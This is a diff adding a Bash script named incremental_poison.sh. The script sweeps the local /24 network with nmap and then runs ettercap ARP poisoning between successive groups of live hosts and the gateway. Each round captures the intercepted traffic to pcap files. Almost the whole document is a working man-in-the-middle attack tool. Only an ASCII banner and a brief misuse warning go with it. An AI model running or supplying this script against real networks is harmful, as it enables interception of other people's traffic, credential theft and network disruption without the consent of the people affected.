@@ -1,0 +1,101 @@
+#!/bin/bash
+
+## Arguments <interface> <number of concurrent hosts> <Unique_Scan_Name>
+
+function splash {
+  echo ""
+  echo "                 . '  ."
+  echo "               ' .( '.) '"
+  echo "       _     ('-.)' (\`'.) '"
+  echo "      |0|- -(. ')\`( .-\`) (-')"
+  echo "   .--\`+'--.  .  (' -,).(') ."
+  echo "   |\`-----'|   (' .) - ('. )"
+  echo "   |       |    . (' \`.  )"
+  echo "   |  .-.  |       \` .  \`"
+  echo "   | (0.0) |"
+  echo "   | >|=|< | INCREMENTAL"
+  echo "   |  \`\"\`  |    POISON"
+  echo "   |       |       ...just a little at a time"
+  echo "   |       |"
+  echo "   \`-.___.-'"
+  echo ""
+  echo ""
+}
+if [ "$#" -ne 3 ]; then
+  splash
+  echo "Description - This script will start poisoning between the defined number of hosts and the gateway"
+  echo "...As soon as each terminal is gracefully ended with 'q', the next one will begin"
+  echo ""
+  echo "Usage - ./incremental_poison.sh [interface] [# of concurrent hosts] [Unique_Scan_Name]"
+  echo "Example - ./incremental_poison.sh eth1 4 BobsHardware_Scan1"
+  echo ""
+  echo "*****************************************************"
+  echo "******************* -- WARNING -- *******************"
+  echo "*****************************************************"
+  echo "**                                                 **"
+  echo "** Caution should be taken when using this script  **"
+  echo "** As with any ARP Poisoning utility, significant  **"
+  echo "** disruption can result from misuse...            **"
+  echo "**                                                 **"
+  echo "*****************************************************"
+  echo ""
+  echo "Author - Justin Hutchens - justinhutchens@gmail.com"
+  echo ""
+  exit
+fi
+
+## Launch awesome ASCII splash art
+splash
+
+## Cleanup Residual Temp Files
+rm *.temp
+
+## Initialize arguments passed into variables
+iface=$1
+hosts=$2
+scanname=$3
+
+## Create Scan Directory
+mkdir $scanname
+
+## Identify IP address, network prefix, and local /24 range
+ip=$(ifconfig $iface | grep inet | grep -v "inet6" | cut -d ":" -f 2 | cut -d " " -f 1)
+prefix=$(echo $ip | cut -d "." -f 1-3)
+range="$prefix.0/24"
+
+## Perform basic discovery scan on local /24 range to output to temp file
+nmap -sn $range -oG results.temp
+
+## Extract live IPs into another temp file
+cat results.temp | grep "Up" | cut -d " " -f 2 > targets.temp
+
+## Identify number of live IPs in range
+lines=$(wc -l targets.temp | cut -d " " -f 1)
+echo "[+] $lines total hosts identified in range..."
+
+## Initialize incremental counters
+x=2
+i=1
+
+## While-loop that extracts the subsequent group of addresses, and then launches poisoning in new terminal
+while [ $x -lt $(($lines+5)) ]; do 
+  group=$(sed -n $x,$(($x+$(($hosts-1))))p targets.temp | cut -d "." -f 4); 
+  echo ""; 
+  echo "[+] Starting Ettercap Capture $i..."; 
+  gnome-terminal -x ettercap -M arp:remote /$prefix.1/ /$prefix.$(echo $group | sed 's/ /,/g')/ -T -i $iface -w $scanname/$scanname_output$i.pcap; 
+  sleep 5;
+  pid=$(ps aux | grep "ettercap -M" | grep -v "grep" | awk '{print $2}'); 
+  while [ $pid ]; do 
+    echo "...Still running"; 
+    sleep 30; 
+    pid=$(ps aux | grep "ettercap -M" | grep -v "grep" | awk '{print $2}'); 
+  done; 
+  echo "[+] Process killed"; 
+  echo "[+] Starting next capture..."; 
+  echo "";
+  x=$((x+$hosts)); 
+  i=$((i+1)); 
+done
+
+## Cleanup Temp Files
+rm *.temp
